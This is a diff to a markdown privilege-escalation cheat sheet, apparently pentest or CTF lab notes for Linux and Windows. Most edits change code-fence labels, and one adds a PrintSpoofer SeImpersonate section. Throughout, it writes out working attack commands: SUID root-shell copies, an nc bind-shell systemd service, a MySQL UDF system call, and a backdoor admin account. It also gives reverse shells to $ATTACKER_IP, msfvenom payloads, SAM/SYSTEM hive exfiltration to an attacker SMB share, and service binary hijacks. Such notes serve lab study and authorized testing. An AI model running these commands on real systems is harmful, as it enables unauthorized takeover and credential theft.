@@ -10,7 +10,7 @@ title: "Privilege Escalation"
 
 connect to the host with metasploit 
 
-```
+```bash
 use scanner/ssh/ssh_login
 set rhosts 10.10.124.253
 set username 10.10.124.253
@@ -21,13 +21,13 @@ run
 
 convert the session to meterpreter
 
-```
+```bash
 sessions -u 1
 ```
 
 show potential privesc exploit
 
-```
+```bash
 run post/multi/recon/local_exploit_suggester
 ```
 
@@ -109,7 +109,7 @@ Then look for the binaries in [GTFOBins (capabilities)](https://gtfobins.github.
 
 Look for binary with capabilities set for your user
 
-```
+```bash
 getcap -r / 2>/dev/null
 ```
 
@@ -147,7 +147,7 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootba
 
 If netcat is available and the `systemctl` command can be abused (see [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)), the following service can be installed to elevate privileges and, even, as a way to create persistance.
 
-```systemd
+```ini
 [Service]
 Type=oneshot
 ExecStart=/bin/sh -c "nc -lp 5555 -e /bin/bash"
@@ -225,7 +225,7 @@ mysql -u root
 
 Install the UDF
 
-```mysql
+```sql
 use mysql;
 create table foo(line blob);
 insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
@@ -235,7 +235,7 @@ create function do_system returns integer soname 'raptor_udf2.so';
 
 Use the function to privesc (here copy a root shell with suid)
 
-```mysql
+```sql
 select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 ```
 
@@ -437,7 +437,7 @@ But there are 3 "hidden" built-in accounts that are important:
 
 Usefull: the following command is creating a `pwnd` user with a sample password and adding it to administrators.
 
-```cmd
+```bash
 net user pwnd SamplePass123 /add & net localgroup administrators pwnd /add
 ```
 
@@ -465,7 +465,7 @@ You can use [mimikatz](https://github.com/gentilkiwi/mimikatz) to dump **SAM**'s
 
 Send the long output to a file:
 
-```cmd
+```bash
 winpeas.exe > outputfile.txt
 ```
 
@@ -475,13 +475,13 @@ winpeas.exe > outputfile.txt
 
 Bypass execution policy
 
-```cmd
+```powershell
 Set-ExecutionPolicy Bypass -Scope process -Force
 ```
 
 Run the ps1 file
 
-```cmd
+```powershell
 . .\PrivescCheck.ps1
 Invoke-PrivescCheck
 ```
@@ -492,19 +492,19 @@ Invoke-PrivescCheck
 
 Store the output of `systeminfo` on the target host
 
-```cmd
+```bash
 systeminfo > systeminfo.txt
 ```
 
 Update the tool's database
 
-```cmd
+```bash
 wes.py --update
 ```
 
 Run the exploit suggester (locally)
 
-```cmd
+```bash
 wes.py systeminfo.txt
 ```
 
@@ -520,19 +520,19 @@ Automated: [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
 
 List local users.
 
-```cmd
+```bash
 net users
 ```
 
 List sensitiv system informations to look for public vulns.
 
-```cmd
+```bash
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 ```
 
 List services:
 
-```cmd
+```bash
 wmic service list
 ```
 
@@ -618,7 +618,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 
 Create an msi file and upload it to the victim
 
-```powershell
+```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f msi -o malicious.msi
 ```
 
@@ -640,7 +640,7 @@ The InstallerFileTakeOver vulnerability has automated exploits too:
 
 List install softaware with
 
-```cmd
+```bash
 wmic.exe product get name,version,vendor
 ```
 
@@ -671,11 +671,11 @@ Override with a reverse shell
 echo 'c:\path\to\nc64.exe -e cmd.exe $ATTACKER_IP $ATTACKER_PORT' > c:\path\to\the\task\file.bat
 ```
 
-### Weak system privileges
+### Weak user privileges
 
 Check privileges
 
-```cmd
+```bash
 whoami /priv
 ```
 
@@ -684,11 +684,27 @@ To understand it:
 * [documentation of all privileges from microsoft](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
 * [list of useful privileges for privilege escalation](https://github.com/gtworek/Priv2Admin)
 
+#### SeImpersonatePrivilege
+
+Download [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+
+```bash
+Invoke-WebRequest -Uri http://10.8.37.127:8000/PrintSpoofer64.exe -OutFile printspoofer.exe
+```
+
+Run it, the resulting shell has us `NT AUTORITY\SYSTEM`
+
+```bash
+.\printspoofer.exe -i -c powershell
+```
+
+(todo: read [this article](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/))
+
 #### SeBackup / SeRestore
 
 Extract system and sam register hives
 
-```cmd
+```powershell
 reg save hklm\system C:\path\to\system.hive
 reg save hklm\sam C:\path\to\sam.hive
 ```
@@ -702,7 +718,7 @@ sudo smbserver.py -smb2support -username $TARGET_USERNAME -password $TARGET_PASS
 
 Copy the files to attacker's smb
 
-```cmd
+```powershell
 copy C:\path\to\sam.hive \\$ATTACKER_IP\public\
 copy C:\path\to\system.hive \\$ATTACKER_IP\public\
 ```
@@ -720,13 +736,13 @@ Here is an exemple with `utilman.exe` but works with anything.
 
 Take ownership on the utilman binary
 
-```cmd
+```powershell
 takeown.exe /f c:\windows\system32\utilman.exe
 ```
 
 Grant yourself full privileges over this file
 
-```cmd
+```powershell
 icacls.exe c:\windows\system32\utilman.exe /grant $USERNAME
 ```
 
@@ -737,7 +753,7 @@ button, a SYSTEM shell appear.
 
 Use the tool [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) to create a reverse shell:
 
-```cmd
+```powershell
 c:\path\to\RogueWinRM.exe -p "C:\path\to\nc64.exe" -a "-e cmd.exe $ATTACKER_IP $ATTACKER_PORT"
 ```
 
@@ -753,19 +769,19 @@ msfvenom -p windows/x64/shell_reverse_tcp lhost=$ATTACKER_IP lport=$ATTACKER_POR
 
 Use the [Accesschk sysinternal](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) to check for the service DACL:
 
-```cmd
+```bash
 accesschk64.exe -qlc VulnService
 ```
 
 Grant permission to everyone to execute the payload
 
-```cmd
+```powershell
 icacls C:\path\to\malicious.exe /grant Everyone:F
 ```
 
 Change the bin path in the service's config
 
-```cmd
+```powershell
 sc.exe config VulnService binPath= "C:\path\to\malicious.exe" obj= LocalSystem
 ```
 
@@ -773,25 +789,25 @@ sc.exe config VulnService binPath= "C:\path\to\malicious.exe" obj= LocalSystem
 
 Look at the service executable path
 
-```cmd
+```bash
 sc qc VulnerableService
 ```
 
 Check if you can modify the bin
 
-```cmd
+```powershell
 icacls c:\path\to\vulnerable.exe
 ```
 
 Override the bin with a reverse shell
 
-```cmd
+```powershell
 move malicious.exe c:\path\to\vulnarble.exe
 ```
 
 Restart if you can or wait for someone to restart it
 
-```cmd
+```bash
 sc stop VulnerableService
 sc start VulnerableService
 ```
@@ -800,13 +816,13 @@ sc start VulnerableService
 
 Look at the service executable path
 
-```cmd
+```bash
 sc qc VulnerableService
 ```
 
 If the path has spaces, you can inject malicious exe in PATH
 
-```cmd
+```powershell
 C:\my program\path\has\spaces.exe # service binary
 C:\my.exe                         # malicious binary
 ```
